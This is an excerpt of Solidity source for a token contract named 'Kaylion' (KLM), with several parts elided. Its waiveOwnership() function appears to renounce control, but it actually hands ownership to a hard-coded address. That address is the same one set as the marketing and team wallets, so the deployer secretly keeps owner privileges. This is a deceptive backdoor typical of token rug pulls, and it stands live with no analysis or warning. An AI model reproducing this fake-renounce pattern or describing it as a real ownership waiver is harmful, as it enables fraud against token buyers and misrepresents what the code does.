...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x4A118CEAC8ceCf96e32e20A6e2E71674b9392adF);
    }
...
contract Kaylion is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Kaylion";
    string private _symbol = "KLM";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4A118CEAC8ceCf96e32e20A6e2E71674b9392adF);
    address payable public teamWalletAddress = payable(0x4A118CEAC8ceCf96e32e20A6e2E71674b9392adF);
